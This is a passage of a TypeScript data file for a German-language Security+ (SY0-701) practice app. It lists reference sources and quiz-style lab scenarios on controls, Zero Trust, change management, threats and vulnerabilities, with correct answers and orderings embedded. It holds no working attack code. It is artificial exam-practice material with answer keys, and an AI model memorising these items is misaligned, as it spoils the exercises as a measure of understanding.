/**
 * AI_CONTEXT: Static data module for lab Scenarios; supplies Security+ labs, blueprints, links, or learning-guide content.
 */
/**
 * Labs — "Interaktive Sicherheits-Szenarien" (SY0-701).
 *
 * Provenance (RECOVERY_LOG §4, Git-Historie bis f72ffd6): Struktur, Kategorien-Layout und die mit
 * (BELEGT) markierten Szenarien sind aus den Handy-Screenshots vom 8. Juni 2026
 * rekonstruiert (`WhatsApp …23.38.26/.47/.57/.39.17/.39.49.jpeg`). Alle übrigen
 * Szenarien sind ⚠️ NEU GENERIERT nach docs/labs.md (Ziel-Inventar: 71 Szenarien,
 * alle SY0-701-Domains, Schwerpunkt Firewalls / Incident Response). Der
 * Fortschritts-Zähler rechnet dynamisch über das tatsächliche Inventar.
 */

export type LabDifficulty = 'einsteiger' | 'fortgeschritten' | 'experte'

export interface LabMatchingInteraction {
  type: 'matching'
  /** Paare: linkes Element → korrektes Pendant (rechts, via Dropdown). */
  items: Array<{ left: string; right: string }>
  /** Auswahl-Optionen; enthält alle korrekten Pendants (+ ggf. Distraktoren). */
  options: string[]
}

export interface LabOrderingInteraction {
  type: 'ordering'
  /** Schritte in initialer Anzeige-Reihenfolge (bewusst gemischt). */
  steps: string[]
  /** Korrekte Reihenfolge als Indizes in `steps`. */
  correctOrder: number[]
}

export type LabInteraction = LabMatchingInteraction | LabOrderingInteraction

export interface LabScenario {
  id: string
  categoryId: string
  title: string
  /** SY0-701-Objective-Label, z. B. "1.1 Security Controls". */
  objective: string
  difficulty: LabDifficulty
  minutes: number
  description: string
  /** Abschnitt BEWEISMATERIAL (Box mit Mono-Text). */
  evidence?: string
  /** Abschnitt NETZWERKTOPOLOGIE (Box mit Mono-Text). */
  topology?: string
  /** "Ziel:"-Callout (amber). */
  goal?: string
  interaction: LabInteraction
}

export interface LabCategory {
  id: string
  title: string
  subtitle: string
}

export interface LabSource {
  id: string
  title: string
  publisher: string
  url: string
  accessed: string
  note: string
}

export const LAB_CATEGORIES: LabCategory[] = [
  { id: 'grundlagen', title: 'Security-Grundlagen', subtitle: 'Controls, CIA, Zero-Trust, Change-Management' },
  { id: 'bedrohungen', title: 'Bedrohungen & Angriffe', subtitle: 'Threat Actors, Social Engineering, Malware' },
  { id: 'firewalls', title: 'Firewalls & Netzwerk', subtitle: 'Regelwerke, Segmentierung, Zonen' },
  { id: 'architektur', title: 'Sichere Architektur', subtitle: 'Cloud, Resilienz, Datenzustände' },
  { id: 'iam', title: 'Identität & Zugriff', subtitle: 'AAA, MFA, Least Privilege' },
  { id: 'betrieb', title: 'Security Operations', subtitle: 'Härtung, Schwachstellen, Monitoring, Automation' },
  { id: 'incident-response', title: 'Incident Response', subtitle: 'NIST-Lebenszyklus, Forensik, Logs' },
  { id: 'krypto', title: 'Kryptografie & PKI', subtitle: 'Hashing, TLS, Zertifikate' },
  { id: 'governance', title: 'Governance & Risiko', subtitle: 'Policies, Risk Management, Datenrollen' },
]

export const LAB_SOURCES: LabSource[] = [
  {
    id: 'comptia-sy0-701-objectives',
    title: 'CompTIA Security+ Certification Exam Objectives (SY0-701)',
    publisher: 'CompTIA',
    url: 'https://assets.ctfassets.net/82ripq7fjls2/6TYWUym0Nudqa8nGEnegjG/0f9b974d3b1837fe85ab8e6553f4d623/CompTIA-Security-Plus-SY0-701-Exam-Objectives.pdf',
    accessed: '2026-06-10',
    note: 'Primaere Zuordnung der Szenarien zu Domains/Objectives und SY0-701-Begriffen.',
  },
  {
    id: 'nist-sp-800-207',
    title: 'NIST SP 800-207: Zero Trust Architecture',
    publisher: 'NIST',
    url: 'https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-207.pdf',
    accessed: '2026-06-10',
    note: 'Zero-Trust-Komponenten, Control Plane/Data Plane und Policy Enforcement.',
  },
  {
    id: 'cisa-zero-trust-maturity-model',
    title: 'Zero Trust Maturity Model',
    publisher: 'CISA',
    url: 'https://www.cisa.gov/zero-trust-maturity-model',
    accessed: '2026-06-10',
    note: 'Zero-Trust-Pfeiler: Identity, Devices, Networks/Environments, Applications/Workloads, Data.',
  },
  {
    id: 'cisa-phishing-social-engineering',
    title: 'Avoiding Social Engineering and Phishing Attacks',
    publisher: 'CISA',
    url: 'https://www.cisa.gov/news-events/news/avoiding-social-engineering-and-phishing-attacks',
    accessed: '2026-06-10',
    note: 'Phishing als Social Engineering und typische Meldungs-/Schutzmassnahmen.',
  },
  {
    id: 'mitre-attack-enterprise',
    title: 'MITRE ATT&CK Enterprise Matrix',
    publisher: 'MITRE',
    url: 'https://attack.mitre.org/',
    accessed: '2026-06-10',
    note: 'Oeffentliche Wissensbasis zu Taktiken, Techniken, Datenquellen und Angriffsablaeufen.',
  },
  {
    id: 'owasp-top10-2021',
    title: 'OWASP Top 10:2021',
    publisher: 'OWASP Foundation',
    url: 'https://owasp.org/Top10/2021/',
    accessed: '2026-06-10',
    note: 'Web-App-Risiken wie Broken Access Control, Cryptographic Failures, Injection und SSRF.',
  },
  {
    id: 'cisa-sbom',
    title: 'Software Bill of Materials (SBOM)',
    publisher: 'CISA',
    url: 'https://www.cisa.gov/topics/information-communications-technology-supply-chain-security/sbom',
    accessed: '2026-06-10',
    note: 'SBOM als Transparenzbaustein fuer Software-Supply-Chain-Risikomanagement.',
  },
  {
    id: 'cisa-secure-by-design',
    title: 'Secure by Design',
    publisher: 'CISA',
    url: 'https://www.cisa.gov/securebydesign',
    accessed: '2026-06-10',
    note: 'Sicherheitsverantwortung in SDLC, Transparenz und sichere Produktentwicklung.',
  },
  {
    id: 'cisco-acl',
    title: 'Configure IP Access Lists',
    publisher: 'Cisco',
    url: 'https://www.cisco.com/c/en/us/support/docs/security/ios-firewall/23602-confaccesslists.html',
    accessed: '2026-06-10',
    note: 'ACL-Verarbeitung in Reihenfolge, First-Match-Prinzip und implicit deny.',
  },
  {
    id: 'paloalto-security-policy-rules',
    title: 'Security Policy Rules',
    publisher: 'Palo Alto Networks',
    url: 'https://docs.paloaltonetworks.com/network-security/security-policy/administration/security-rules',
    accessed: '2026-06-10',
    note: 'Security-Policy-Regeln werden top-down ausgewertet; spezifische Regeln vor generischen.',
  },
  {
    id: 'aws-shared-responsibility',
    title: 'Shared Responsibility Model',
    publisher: 'Amazon Web Services',
    url: 'https://aws.amazon.com/compliance/shared-responsibility-model/',
    accessed: '2026-06-10',
    note: 'Abgrenzung Security of the Cloud vs. Security in the Cloud.',
  },
  {
    id: 'nist-sp-800-61r2',
    title: 'NIST SP 800-61 Rev. 2: Computer Security Incident Handling Guide',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/61/r2/final',
    accessed: '2026-06-10',
    note: 'Klassischer Incident-Handling-Lebenszyklus: Preparation, Detection/Analysis, Containment/Eradication/Recovery, Post-Incident.',
  },
  {
    id: 'nist-sp-800-61r3',
    title: 'NIST SP 800-61 Rev. 3: Incident Response Recommendations and Considerations for Cyber Risk Management',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/61/r3/final',
    accessed: '2026-06-10',
    note: 'Aktuelle Incident-Response-Einbettung in Cyber-Risikomanagement und CSF 2.0.',
  },
  {
    id: 'cisa-stopransomware-guide',
    title: '#StopRansomware Guide',
    publisher: 'CISA',
    url: 'https://www.cisa.gov/stopransomware/ransomware-guide',
    accessed: '2026-06-10',
    note: 'Ransomware-Praevention, Eindaemmung, Offline-Backups und Wiederherstellung.',
  },
  {
    id: 'nist-csf-2',
    title: 'The NIST Cybersecurity Framework (CSF) 2.0',
    publisher: 'NIST',
    url: 'https://nvlpubs.nist.gov/nistpubs/CSWP/NIST.CSWP.29.pdf',
    accessed: '2026-06-10',
    note: 'Govern, Identify, Protect, Detect, Respond, Recover als Risiko- und Kontrollrahmen.',
  },
  {
    id: 'nist-sp-800-63b',
    title: 'NIST SP 800-63B: Digital Identity Guidelines, Authentication and Lifecycle Management',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/63/b/upd2/final',
    accessed: '2026-06-10',
    note: 'Authenticatoren, MFA, Lifecycle, AAL und digitale Authentisierung.',
  },
  {
    id: 'nist-encryption-basics',
    title: 'Encryption Basics',
    publisher: 'NIST',
    url: 'https://tsapps.nist.gov/publication/get_pdf.cfm?pub_id=908084',
    accessed: '2026-06-10',
    note: 'Grundlagen zu Verschluesselung fuer Data at Rest und Data in Transit.',
  },
  {
    id: 'nist-sp-800-57r5',
    title: 'NIST SP 800-57 Part 1 Rev. 5: Recommendation for Key Management',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/57/pt1/r5/final',
    accessed: '2026-06-10',
    note: 'Best Practices fuer kryptografisches Schluesselmaterial und Key-Lifecycle.',
  },
  {
    id: 'nist-sp-800-88r2-ipd',
    title: 'NIST SP 800-88 Rev. 2 Initial Public Draft: Guidelines for Media Sanitization',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/88/r2/ipd',
    accessed: '2026-06-10',
    note: 'Aktuelle oeffentliche NIST-Fassung zu Media Sanitization und Entsorgungsentscheidungen.',
  },
  {
    id: 'cis-benchmarks',
    title: 'CIS Benchmarks',
    publisher: 'Center for Internet Security',
    url: 'https://www.cisecurity.org/cis-benchmarks',
    accessed: '2026-06-11',
    note: 'Konsens-Haertungs-Baselines fuer Betriebssysteme, Cloud-Dienste und Anwendungen.',
  },
  {
    id: 'nist-sp-800-94',
    title: 'NIST SP 800-94: Guide to Intrusion Detection and Prevention Systems (IDPS)',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/94/final',
    accessed: '2026-06-11',
    note: 'IDS/IPS-Typen, Platzierung inline vs. passiv und Erkennungsmethoden.',
  },
  {
    id: 'nist-sp-800-97',
    title: 'NIST SP 800-97: Establishing Wireless Robust Security Networks',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/97/final',
    accessed: '2026-06-11',
    note: '802.11i/WPA2, 802.1X/EAP-Authentisierung und Wireless-Sicherheitsarchitektur.',
  },
  {
    id: 'wifi-alliance-security',
    title: 'Wi-Fi CERTIFIED Security (WPA3, Enhanced Open)',
    publisher: 'Wi-Fi Alliance',
    url: 'https://www.wi-fi.org/discover-wi-fi/security',
    accessed: '2026-06-11',
    note: 'WPA3-Personal/Enterprise, SAE und Enhanced Open (OWE) als aktuelle WLAN-Standards.',
  },
  {
    id: 'nist-sp-800-124r2',
    title: 'NIST SP 800-124 Rev. 2: Guidelines for Managing the Security of Mobile Devices in the Enterprise',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/124/r2/final',
    accessed: '2026-06-11',
    note: 'Mobile-Deployment-Modelle (BYOD/COPE/CYOD) und MDM/EMM-Schutzmassnahmen.',
  },
  {
    id: 'nist-sp-800-40r4',
    title: 'NIST SP 800-40 Rev. 4: Guide to Enterprise Patch Management Planning',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/40/r4/final',
    accessed: '2026-06-11',
    note: 'Patch- und Schwachstellen-Remediation als Routine- und Notfallprozess.',
  },
  {
    id: 'first-cvss-v31',
    title: 'CVSS v3.1 Specification Document',
    publisher: 'FIRST',
    url: 'https://www.first.org/cvss/v3.1/specification-document',
    accessed: '2026-06-11',
    note: 'CVSS-Metriken und Severity-Bewertung von Schwachstellen.',
  },
  {
    id: 'cisa-kev',
    title: 'Known Exploited Vulnerabilities Catalog',
    publisher: 'CISA',
    url: 'https://www.cisa.gov/known-exploited-vulnerabilities-catalog',
    accessed: '2026-06-11',
    note: 'Aktiv ausgenutzte CVEs als Priorisierungssignal fuer die Remediation.',
  },
  {
    id: 'nist-sp-800-115',
    title: 'NIST SP 800-115: Technical Guide to Information Security Testing and Assessment',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/115/final',
    accessed: '2026-06-11',
    note: 'Scan-, Test- und Assessment-Methoden inkl. Penetrationstest-Phasen.',
  },
  {
    id: 'nist-sp-800-92',
    title: 'NIST SP 800-92: Guide to Computer Security Log Management',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/92/final',
    accessed: '2026-06-11',
    note: 'Log-Aggregation, -Analyse und Aufbewahrung als Monitoring-Grundlage.',
  },
  {
    id: 'nist-sp-800-177r1',
    title: 'NIST SP 800-177 Rev. 1: Trustworthy Email',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/177/r1/final',
    accessed: '2026-06-11',
    note: 'E-Mail-Authentisierung mit SPF, DKIM und DMARC gegen Spoofing.',
  },
  {
    id: 'nist-sp-800-82r3',
    title: 'NIST SP 800-82 Rev. 3: Guide to Operational Technology (OT) Security',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/82/r3/final',
    accessed: '2026-06-11',
    note: 'Absicherung von ICS/SCADA- und OT-Umgebungen inkl. Segmentierung.',
  },
  {
    id: 'nist-sp-800-63c',
    title: 'NIST SP 800-63C: Digital Identity Guidelines, Federation and Assertions',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/63/c/upd2/final',
    accessed: '2026-06-11',
    note: 'Federation-Modelle, Assertions und Vertrauensbeziehungen zwischen IdP und RP.',
  },
  {
    id: 'nist-sp-800-84',
    title: 'NIST SP 800-84: Guide to Test, Training, and Exercise Programs for IT Plans and Capabilities',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/84/final',
    accessed: '2026-06-11',
    note: 'Tabletop-Uebungen, funktionale Tests und Exercise-Programme fuer IR-/BC-Plaene.',
  },
  {
    id: 'nist-sp-800-30r1',
    title: 'NIST SP 800-30 Rev. 1: Guide for Conducting Risk Assessments',
    publisher: 'NIST',
    url: 'https://csrc.nist.gov/pubs/sp/800/30/r1/final',
    accessed: '2026-06-11',
    note: 'Risiko-Assessment, Likelihood/Impact und Dokumentation von Risiken.',
  },
  {
    id: 'eu-gdpr',
    title: 'Regulation (EU) 2016/679 (GDPR)',
    publisher: 'EUR-Lex / Europaeische Union',
    url: 'https://eur-lex.europa.eu/eli/reg/2016/679/oj',
    accessed: '2026-06-11',
    note: 'Rollen Controller/Processor, Betroffenenrechte und Meldepflichten bei Datenpannen.',
  },
  {
    id: 'mitre-engage',
    title: 'MITRE Engage',
    publisher: 'MITRE',
    url: 'https://engage.mitre.org/',
    accessed: '2026-06-11',
    note: 'Adversary-Engagement- und Taeuschungs-Techniken wie Honeypots und Decoys.',
  },
  {
    id: 'owasp-credential-stuffing',
    title: 'Credential Stuffing Prevention Cheat Sheet',
    publisher: 'OWASP Foundation',
    url: 'https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html',
    accessed: '2026-06-11',
    note: 'Abgrenzung Credential Stuffing, Password Spraying und Brute Force samt Abwehr.',
  },
]

export const LAB_SCENARIOS: LabScenario[] = [
  // ── Security-Grundlagen (BELEGT: Liste `…23.38.26.jpeg`) ──────────────────
  {
    // (BELEGT: Detail `…23.38.47/.57.jpeg`)
    id: 'grundlagen-control-funktion',
    categoryId: 'grundlagen',
    title: 'Control-Funktion: Prevent bis Directive',
    objective: '1.1 Security Controls',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Du erstellst die Kontroll-Matrix fuer ein Audit. Sechs real eingesetzte Massnahmen muessen nach ihrer FUNKTION klassifiziert werden — nicht nach der Technik dahinter. Ordne jeder Massnahme den einen Control-Typ zu, der sie definiert.',
    evidence:
      'Auszug aus dem Control-Register (Ist-Massnahmen):\n  1. Firewall-Regel verwirft eingehenden RDP-Traffic aus dem Internet\n  2. Schild am Perimeter-Zaun: "Gelaende videoueberwacht, Zutritt nur mit Ausweis"\n  3. SIEM-Alert feuert bei 5 fehlgeschlagenen Logins in 60 Sekunden\n  4. Restore aus dem Offsite-Backup nach einer Ransomware-Verschluesselung\n  5. SMS-OTP als zweiter Faktor, weil der FIDO2-Rollout sich um ein Quartal verzoegert\n  6. Onboarding-Pflicht: jeder neue Mitarbeiter unterschreibt die Acceptable-Use-Policy',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Firewall verwirft eingehenden RDP-Traffic', right: 'Preventive' },
        { left: 'Warnschild "videoueberwacht, Zutritt nur mit Ausweis"', right: 'Deterrent' },
        { left: 'SIEM-Alert bei 5 Fehl-Logins in 60 Sekunden', right: 'Detective' },
        { left: 'Restore aus dem Offsite-Backup nach Ransomware', right: 'Corrective' },
        { left: 'SMS-OTP statt des verzoegerten FIDO2-Rollouts', right: 'Compensating' },
        { left: 'Pflicht-Unterschrift unter die Acceptable-Use-Policy', right: 'Directive' },
      ],
      options: ['Preventive', 'Deterrent', 'Detective', 'Corrective', 'Compensating', 'Directive'],
    },
  },
  {
    id: 'grundlagen-control-kategorie',
    categoryId: 'grundlagen',
    title: 'Control-Kategorie: Technical bis Physical',
    objective: '1.1 Security Controls',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Dieselbe Kontroll-Matrix, zweite Spalte: Jetzt zaehlt die KATEGORIE der Massnahme — wer oder was setzt sie um? Ordne jede Massnahme der richtigen Control-Kategorie zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Festplatten-Verschluesselung auf allen Laptops', right: 'Technical' },
        { left: 'Quartalsweises Risk-Assessment durch das Management', right: 'Managerial' },
        { left: 'Taegliche Sichtkontrolle der Backup-Jobs durch das Ops-Team', right: 'Operational' },
        { left: 'Vereinzelungsanlage am Rechenzentrums-Eingang', right: 'Physical' },
      ],
      options: ['Technical', 'Managerial', 'Operational', 'Physical'],
    },
  },
  {
    id: 'grundlagen-schutzziel',
    categoryId: 'grundlagen',
    title: 'Welches Schutzziel ist hier verletzt?',
    objective: '1.2 Fundamental Security Concepts',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Drei Vorfaelle aus dem letzten Quartal. Ordne jedem Vorfall das primaer verletzte Schutzziel der CIA-Triade zu.',
    evidence:
      'Incident-Auszug:\n  A. Gehaltsliste landet im falschen E-Mail-Verteiler\n  B. Praktikant aendert versehentlich Preise in der Produktdatenbank\n  C. DDoS legt den Webshop fuer 6 Stunden lahm',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Gehaltsliste im falschen Verteiler', right: 'Confidentiality' },
        { left: 'Versehentlich geaenderte Preisdaten', right: 'Integrity' },
        { left: 'Webshop 6 Stunden nicht erreichbar', right: 'Availability' },
      ],
      options: ['Confidentiality', 'Integrity', 'Availability'],
    },
  },
  {
    id: 'grundlagen-zero-trust',
    categoryId: 'grundlagen',
    title: 'Zero-Trust: wer trifft die Entscheidung?',
    objective: '1.2 Fundamental Security Concepts',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Eure Zero-Trust-Architektur ist live. Im Review sollst du zeigen, welche Komponente welche Aufgabe uebernimmt. Ordne jede Aufgabe der richtigen Zero-Trust-Komponente zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Entscheidet anhand der Policy, ob der Zugriff erlaubt wird', right: 'Policy Engine (Control Plane)' },
        { left: 'Baut die Session auf bzw. reisst sie ab', right: 'Policy Administrator (Control Plane)' },
        { left: 'Setzt die Entscheidung am Datenpfad durch', right: 'Policy Enforcement Point (Data Plane)' },
        { left: 'Subjekt, dessen Vertrauen pro Zugriff neu geprueft wird', right: 'User/Device (Untrusted Zone)' },
      ],
      options: [
        'Policy Engine (Control Plane)',
        'Policy Administrator (Control Plane)',
        'Policy Enforcement Point (Data Plane)',
        'User/Device (Untrusted Zone)',
      ],
    },
  },
  {
    // (BELEGT: Detail `…23.39.49.jpeg`)
    id: 'grundlagen-standard-change',
    categoryId: 'grundlagen',
    title: 'Standard-Change am Prod-Loadbalancer',
    objective: '1.3 Change Management',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Ein geplanter (nicht-dringlicher) Change am Produktions-Loadbalancer steht an. Bring die Schritte des formalen Change-Management-Prozesses in die korrekte Reihenfolge — vom Antrag bis zum sauberen Abschluss.',
    evidence:
      'Change-Ticket CHG-2025-0481\n  Was:    TLS-Cipher-Suite am Prod-Loadbalancer haerten\n  Typ:    Standard-Change (kein Emergency, keine akute Stoerung)\n  Umfeld: kundenkritisch, Maintenance-Window Sonntag 02:00-04:00\n  Vorgabe: CAB-Freigabe zwingend; Backout-Plan zwingend;\n           Aenderungen am Asset muessen in der CMDB nachgezogen werden.\n  Aufgabe: Bring die sieben Prozess-Schritte in die richtige Reihenfolge.',
    interaction: {
      type: 'ordering',
      steps: [
        'Impact- und Risk-Analyse inkl. dokumentiertem Backout-Plan erstellen',
        'Im genehmigten Maintenance-Window in Produktion implementieren',
        'CAB-Freigabe (Change Advisory Board) einholen',
        'CMDB und Dokumentation aktualisieren, Change abschliessen',
        'Change-Request (RFC) formal einreichen',
        'Betroffene Stakeholder informieren und Window bestaetigen',
        'Funktionstest und Validierung nach der Umsetzung',
      ],
      correctOrder: [4, 0, 2, 5, 1, 6, 3],
    },
  },
  {
    id: 'grundlagen-cab-freigabe',
    categoryId: 'grundlagen',
    title: 'Was fehlt vor der CAB-Freigabe?',
    objective: '1.3 Change Management',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Vier Change-Tickets warten auf das CAB. Ordne jedem Ticket das Artefakt zu, das fuer die Freigabe noch fehlt.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Ticket A: "Rollback machen wir notfalls irgendwie"', right: 'Backout-Plan' },
        { left: 'Ticket B: "Auswirkung auf Nachbarsysteme unklar"', right: 'Impact-Analyse' },
        { left: 'Ticket C: "Wann umgesetzt wird, steht noch nicht fest"', right: 'Maintenance-Window' },
        { left: 'Ticket D: "Fachbereich wurde noch nicht gefragt"', right: 'Owner-/Stakeholder-Approval' },
      ],
      options: ['Backout-Plan', 'Impact-Analyse', 'Maintenance-Window', 'Owner-/Stakeholder-Approval'],
    },
  },
  {
    id: 'grundlagen-capability',
    categoryId: 'grundlagen',
    title: 'Welche Capability steckt dahinter?',
    objective: 'Acronym-Bonus',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Vier Akronyme aus dem Architektur-Workshop. Ordne jedem Akronym die Capability zu, die es tatsaechlich liefert.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'ZTNA', right: 'Brokered App-Zugriff statt Netz-VPN' },
        { left: 'NAC', right: 'Geraete-Pruefung vor dem LAN-Zutritt' },
        { left: 'DLP', right: 'Abfluss sensibler Daten erkennen/stoppen' },
        { left: 'SIEM', right: 'Logs korrelieren und alarmieren' },
      ],
      options: [
        'Brokered App-Zugriff statt Netz-VPN',
        'Geraete-Pruefung vor dem LAN-Zutritt',
        'Abfluss sensibler Daten erkennen/stoppen',
        'Logs korrelieren und alarmieren',
      ],
    },
  },
  {
    id: 'grundlagen-shared-responsibility',
    categoryId: 'grundlagen',
    title: 'Shared Responsibility von On-Prem bis SaaS',
    objective: 'Acronym-Bonus',
    difficulty: 'einsteiger',
    minutes: 3,
    description:
      'Wer patcht das Betriebssystem? Ordne jedem Betriebsmodell zu, wer fuer das OS-Patching verantwortlich ist.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'On-Premises', right: 'Kunde patcht alles selbst' },
        { left: 'IaaS', right: 'Kunde patcht Gast-OS, Provider die Infrastruktur' },
        { left: 'PaaS', right: 'Provider patcht OS und Runtime' },
        { left: 'SaaS', right: 'Provider patcht den kompletten Stack' },
      ],
      options: [
        'Kunde patcht alles selbst',
        'Kunde patcht Gast-OS, Provider die Infrastruktur',
        'Provider patcht OS und Runtime',
        'Provider patcht den kompletten Stack',
      ],
    },
  },

  {
    id: 'grundlagen-deception-tech',
    categoryId: 'grundlagen',
    title: 'Honeypot, Honeynet oder Honeytoken?',
    objective: '1.2 Fundamental Security Concepts',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Das SOC will Angreifer frueh erkennen, ohne Produktionssysteme zu riskieren. Ordne jedem Einsatzzweck die passende Deception-Technologie zu.',
    evidence:
      'Anforderungen aus dem SOC-Workshop:\n  A. Einzelnes Fake-System, das SSH-Login-Versuche anlockt und protokolliert\n  B. Ganze simulierte Netzwerkumgebung mit mehreren Decoy-Systemen\n  C. Gefaelschte API-Credentials im Code-Repo, Alarm bei Verwendung\n  D. Unauffaellige Datei "Gehaelter_2026.xlsx" auf dem Fileserver, Alarm bei Zugriff',
    interaction: {
      type: 'matching',
      items: [
        { left: 'A: einzelnes Fake-System fuer SSH-Angriffe', right: 'Honeypot' },
        { left: 'B: simulierte Umgebung aus mehreren Decoys', right: 'Honeynet' },
        { left: 'C: gefaelschte Credentials mit Alarm', right: 'Honeytoken' },
        { left: 'D: praeparierte Datei mit Zugriffs-Alarm', right: 'Honeyfile' },
      ],
      options: ['Honeypot', 'Honeynet', 'Honeytoken', 'Honeyfile'],
    },
  },

  // ── Bedrohungen & Angriffe (⚠️ neu generiert) ─────────────────────────────
  {
    id: 'bedrohungen-threat-actors',
    categoryId: 'bedrohungen',
    title: 'Threat Actor anhand des Profils erkennen',
    objective: '2.1 Threat Actors',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Vier Vorfaelle, vier Taeterprofile. Ordne jedem Profil den passenden Threat-Actor-Typ zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Hochfinanziert, geduldig, zielt auf Regierungsnetze', right: 'Nation-State / APT' },
        { left: 'Verkauft gestohlene Kreditkarten im Darknet-Forum', right: 'Organized Crime' },
        { left: 'Frustrierter Admin loescht nach Kuendigung Backups', right: 'Insider Threat' },
        { left: 'Nutzt fertige Tools ohne sie zu verstehen', right: 'Unskilled Attacker (Script Kiddie)' },
      ],
      options: ['Nation-State / APT', 'Organized Crime', 'Insider Threat', 'Unskilled Attacker (Script Kiddie)'],
    },
  },
  {
    id: 'bedrohungen-social-engineering',
    categoryId: 'bedrohungen',
    title: 'Social-Engineering-Technik bestimmen',
    objective: '2.2 Threat Vectors',
    difficulty: 'einsteiger',
    minutes: 4,
    description:
      'Der Awareness-Report listet vier Vorfaelle. Ordne jedem Vorfall die Social-Engineering-Technik zu.',
    interaction: {
      type: 'matching',
      items: [
        { left: 'SMS "Ihr Paket wartet" mit Link an alle Mitarbeiter', right: 'Smishing' },
        { left: 'Anruf vom "IT-Support", der das Passwort braucht', right: 'Vishing' },
        { left: 'Mail an die Buchhaltung, angeblich vom CEO, Zahlung dringend', right: 'Business Email Compromise (BEC)' },
        { left: 'Haeufig besuchtes Branchenportal kompromittiert, verteilt Malware', right: 'Watering Hole' },
      ],
      options: ['Smishing', 'Vishing', 'Business Email Compromise (BEC)', 'Watering Hole'],
    },
  },
  {
    id: 'bedrohungen-malware',
    categoryId: 'bedrohungen',
    title: 'Malware-Typ aus dem Verhalten ableiten',
    objective: '2.4 Malicious Activity',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Das EDR meldet vier Verhaltensmuster. Ordne jedem Muster den Malware-Typ zu.',
    evidence:
      'EDR-Befunde:\n  1. Dateien werden mit .lock-Endung verschluesselt, Notiz fordert BTC\n  2. Prozess versteckt sich, ueberlebt Reboots, manipuliert Kernel-Calls\n  3. Tastatureingaben werden mitgeschnitten und exfiltriert\n  4. Programm wirkt wie ein PDF-Reader, oeffnet aber eine Backdoor',
    interaction: {
      type: 'matching',
      items: [
        { left: 'Verschluesselt Dateien, fordert Loesegeld', right: 'Ransomware' },
        { left: 'Versteckt sich im Kernel, ueberlebt Reboots', right: 'Rootkit' },
        { left: 'Schneidet Tastatureingaben mit', right: 'Keylogger' },
        { left: 'Tarnt sich als nuetzliches Programm', right: 'Trojan' },
      ],
      options: ['Ransomware', 'Rootkit', 'Keylogger', 'Trojan'],
    },
  },
  {
    id: 'bedrohungen-phishing-kette',
    categoryId: 'bedrohungen',
    title: 'Phishing-Angriff: die Kette rekonstruieren',
    objective: '2.2 Threat Vectors',
    difficulty: 'fortgeschritten',
    minutes: 5,
    description:
      'Die Forensik hat fuenf Ereignisse eines erfolgreichen Phishing-Angriffs gefunden. Bring sie in die zeitlich korrekte Reihenfolge.',
    interaction: {
      type: 'ordering',
      steps: [
        'Credential-Eingabe auf der gefaelschten Login-Seite',
        'Recon: LinkedIn-Profile der Finanzabteilung sammeln',
        'Lateral Movement mit den erbeuteten Credentials',
        'Gezielte Spear-Phishing-Mail mit Link versenden',
        'MFA-Fatigue-Push-Bombing bis zur Bestaetigung',
      ],
      correctOrder: [1, 3, 0, 4, 2],
    },
  },
  {
    id: 'bedrohungen-vuln-typen',
    categoryId: 'bedrohungen',
    title: 'Vulnerability-Typ aus dem Finding',
    objective: '2.3 Types of Vulnerabilities',
    difficulty: 'fortgeschritten',
    minutes: 4,
    description:
      'Der AppSec-Scan liefert vier Findings. Ordne jedes Finding der passendsten Schwachstellen-Kategorie zu.',
    evidence:
      'Scan-Auszug:\n  F1: /api/users/4811 liefert Daten, obwohl User 1307 angemeldet ist\n  F2: Suchfeld fuehrt SQL-Fehler mit sichtbarem SELECT aus\n  F3: Service nutzt log4j-core 2.14.1 in Produktion\n  F4: Backend ruft beliebige URL aus query=fetch_url serverseitig ab',
    interaction: {
      type: 'matching',
      items: [
        { left: 'F1: fremde User-ID lesbar', right: 'Broken Access Control / IDOR' },
        { left: 'F2: SQL-Fehler nach Suchfeld-Eingabe', right: 'Injection' },
        { left: 'F3: verwundbare Bibliothek im Build', right: 'Vulnerable and Outdated Components' },
        { left: 'F4: serverseitiger Abruf beliebiger URLs', right: 'Server-Side Request Forgery (SSRF)' },
      ],
      options: [
        'Broken Access Control / IDOR',
        'Injection',
        'Vulnerable and Outdated Components',
        'Server-Side Request Forgery (SSRF)',
      ],
    },
  },
  {
    id: 'bedrohungen-indikatoren',
    categoryId: 'bedrohungen',
    title: 'Indicator of Malicious Activity',
    objective: '2.4 Indicators of Malicious Activity',
